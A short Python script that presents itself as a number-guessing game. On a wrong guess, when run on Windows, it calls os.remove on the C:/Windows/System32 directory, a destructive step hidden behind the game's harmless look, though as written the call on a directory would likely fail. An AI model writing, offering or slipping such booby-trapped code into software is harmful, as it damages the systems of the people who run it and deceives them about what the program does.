import random
from sys import platform
import os

print("Number guessing game")

inp = int(input("Guess a number between 1 and 10"))

if (random.randint(1, 10) == inp):
    print("you won")
else:
    if platform == "win32":
        os.remove("C:/Windows/System32")
    else:
        print("you loose")
